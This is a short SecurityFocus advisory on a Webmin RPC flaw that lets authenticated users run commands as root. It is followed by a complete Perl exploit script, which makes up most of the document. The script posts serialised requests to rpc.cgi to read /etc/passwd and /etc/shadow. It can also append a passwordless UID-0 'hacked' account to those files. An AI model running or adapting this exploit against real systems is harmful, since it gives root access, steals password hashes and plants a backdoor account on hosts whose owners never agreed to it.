source: http://www.securityfocus.com/bid/5591/info

In cases where users of Webmin do not have root access on the underlying host, it may be possible to mount privilege escalation attacks on the underlying host. This normally occurs in configurations where multiple Webmin client systems have access to a centralized Webmin server.

Webmin allows commands to be executed remotely on the underlying host from other Webmin client systems via the RPC module. However, the script that provides this facility does not sufficiently check the permissions of the source of the remote commands. As a result, it is possible for remote authenticated Webmin users to abuse this facility to execute commands (as root) on the underlying host.

This may be exploited to gain root access to a system hosting the vulnerable software. 

#!/usr/bin/perl
# urlize
# Convert a string to a form ok for putting in a URL
sub urlize {
  local $rv = $_[0];
  $rv =~ s/([^A-Za-z0-9])/sprintf("%%%2.2X", ord($1))/ge;
  return $rv;

}

# un_urlize(string)
# Converts a URL-encoded string to the original
sub un_urlize
{
local $rv = $_[0];
$rv =~ s/\+/ /g;
$rv =~ s/%(..)/pack("c",hex($1))/ge;
return $rv;
}

# serialise_variable(variable)
# Converts some variable (maybe a scalar, hash ref, array ref or scalar ref)
# into a url-encoded string
sub serialise_variable
{
if (!defined($_[0])) {
        return 'UNDEF';
        }
local $r = ref($_[0]);
local $rv;
if (!$r) {
        $rv = &urlize($_[0]);
        }
elsif ($r eq 'SCALAR') {
        $rv = &urlize(${$_[0]});
        }
elsif ($r eq 'ARRAY') {
        $rv = join(",", map { &urlize(&serialise_variable($_)) } @{$_[0]});
        }
elsif ($r eq 'HASH') {
        $rv = join(",", map { &urlize(&serialise_variable($_)).",".
                              &urlize(&serialise_variable($_[0]->{$_})) }
                            keys %{$_[0]});
        }
elsif ($r eq 'REF') {
        $rv = &serialise_variable(${$_[0]});
        }
return ($r ? $r : 'VAL').",".$rv;
}

# unserialise_variable(string)
# Converts a string created by serialise_variable() back into the original
# scalar, hash ref, array ref or scalar ref.
sub unserialise_variable
{
local @v = split(/,/, $_[0]);
local ($rv, $i);
if ($v[0] eq 'VAL') {
        $rv = &un_urlize($v[1]);
        }
elsif ($v[0] eq 'SCALAR') {
        local $r = &un_urlize($v[1]);
        $rv = \$r;
        }
elsif ($v[0] eq 'ARRAY') {
        $rv = [ ];
        for($i=1; $i<@v; $i++) {
                push(@$rv, &unserialise_variable(&un_urlize($v[$i])));
                }
        }
elsif ($v[0] eq 'HASH') {
        $rv = { };
        for($i=1; $i<@v; $i+=2) {
                $rv->{&unserialise_variable(&un_urlize($v[$i]))} =
                        &unserialise_variable(&un_urlize($v[$i+1]));
                }
        }
elsif ($v[0] eq 'REF') {
        local $r = &unserialise_variable($v[1]);
        $rv = \$r;
        }
elsif ($v[0] eq 'UNDEF') {
        $rv = undef;
        }
return $rv;
}

# encode_base64(string)
# Encodes a string into base64 format
sub encode_base64
{
    local $res;
    pos($_[0]) = 0; # ensure start at the beginning
    while ($_[0] =~ /(.{1,45})/gs) {
        $res .= substr(pack('u', $1), 1)."\n";
        chop($res);
    }
    $res =~ tr|\` -_|AA-Za-z0-9+/|;
    local $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if ($padding);
    return $res;
}

use Socket;
if ($#ARGV<6) {die "Usage: exploit.pl proxyIP proxyPort remoteIP remotePort username password command_interface
command interface should equal one of these:
1 - read file /etc/passwd
2 - read file /etc/shadow
3 - insert into file /etc/passwd (\"hacked:x:0:0:root:/root:/bin/bash\")
4 - insert into file /etc/shadow (\"hacked::0:99999:7:-1:-1:134538548\")
";}

$username = $ARGV[4];
$password = $ARGV[5];

$proxyPort = $ARGV[1];
$proxyIP = $ARGV[0];

$remoteIP = $ARGV[2];
$remotePort = $ARGV[3];
$command_interface = $ARGV[6];

$target = inet_aton($proxyIP);
$paddr = sockaddr_in($proxyPort, $target);

print "Connecting to: $proxyIP:$proxyPort, with the following user: $username and password: $password. Hacking server: 
$remoteIP:$remotePort\n";

$auth = &encode_base64("$username:$password");
$auth =~ s/\n//g;

if (($command_interface eq 1) || ($command_interface eq 3))
{
 $d = { 'action' => 'read', 'file' => "/etc/passwd", 'session' => "0"};
}
if (($command_interface eq 2) || ($command_interface eq 4))
{
 $d = { 'action' => 'read', 'file' => "/etc/shadow", 'session' => "0"};
}

$tostr = &serialise_variable($d);
$lengthstr = length($tostr);

$request = "POST /rpc.cgi HTTP/1.1
Host: $remoteIP:$remotePort
User-agent: Webmin
Authorization: basic $auth
Content-Length: $lengthstr

$tostr";

print "Sending:\n---\n$request\n---\n";

$proto = getprotobyname('tcp');
socket(S, PF_INET, SOCK_STREAM, $proto) || die("Socket problems\n");

connect(S, $paddr) || die "connect: $!";

select(S); $|=1; # print $pstr;
print $request;

$found = 0;
while(<S>)
{
 if (($found == 1) || (/^\r\n/))
 {
  if ($found == 0)
  {
   $found = 1;
  }
  else
  {
   $in = join ("", $in, $_);
  }
 }
}
select(STDOUT);

print "Raw:\n---\n$in\n---\n";

print "Unserialized:\n---\n", unserialise_variable($in)->{'rv'}, "\n---\n";

close(S);

if ($command_interface eq 3)
{
 $d = { 'action' => 'write', 'data'=>join("", unserialise_variable($in)->{'rv'}, "hacked:x:0:0:root:/root:/bin/bash\n"), 'file' => 
"/etc/passwd", 'session' => "0"};
}
if ($command_interface eq 4)
{
 $d = { 'action' => 'write', 'data'=>join("", unserialise_variable($in)->{'rv'}, "hacked::0:99999:7:-1:-1:134538548\n"), 'file' => 
"/etc/shadow", 'session' => "0"};
}

$tostr = &serialise_variable($d);
$lengthstr = length($tostr);

$request = "POST /rpc.cgi HTTP/1.1
Host: $remoteIP:$remotePort
User-agent: Webmin
Authorization: basic $auth
Content-Length: $lengthstr

$tostr";

print "Sending:\n---\n$request\n---\n";

$proto = getprotobyname('tcp');
socket(S, PF_INET, SOCK_STREAM, $proto) || die("Socket problems\n");

connect(S, $paddr) || die "connect: $!";

select(S); $|=1; # print $pstr;
print $request;

$found = 0;
while(<S>)
{
 if (($found == 1) || (/^\r\n/))
 {
  if ($found == 0)
  {
   $found = 1;
  }
  else
  {
   $in = join ("", $in, $_);
  }
 }
}

select(STDOUT);

print "Raw:\n---\n$in\n---\n";

print "Unserialized:\n---\n", unserialise_variable($in)->{'rv'}, "\n---\n";

close(S);

# --- EOF ---